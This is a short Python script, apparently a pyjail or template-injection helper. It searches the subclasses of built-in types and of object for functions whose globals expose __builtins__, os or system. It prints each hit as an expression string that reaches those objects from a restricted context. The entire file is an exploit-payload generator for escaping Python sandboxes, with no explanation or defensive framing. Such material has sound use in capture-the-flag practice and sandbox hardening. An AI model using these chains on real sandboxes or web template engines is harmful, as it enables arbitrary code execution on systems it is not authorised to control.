import re

for obj in [(), [], {}, ""]:
    classes = obj.__class__.__subclasses__()
    for i, c in enumerate(classes):
        for attr in dir(c):
            try:
                if "__builtins__" in getattr(c, attr).__globals__:
                    code = f'{repr(obj)}.__class__.__subclasses__()[{i}].{attr}.__globals__["__builtins__"]'
                    assert "breakpoint" in eval(code)
                    print(code)
            except:
                pass

classes = ().__class__.__base__.__subclasses__()
for i, c in enumerate(classes):
    for attr in dir(c):
        for target in ["__builtins__", "system", "os"]:
            try:
                if target in getattr(c, attr).__globals__:
                    code = f'().__class__.__base__.__subclasses__()[{i}].{attr}.__globals__["{target}"]'
                    if target == "__builtins__" and "breakpoint" not in eval(code):
                        continue
                    elif target == "system" and "system" != eval(code).__name__:
                        continue
                    elif target == "os" and "os" != eval(code).__name__:
                        continue
                    print(code)
            except:
                pass
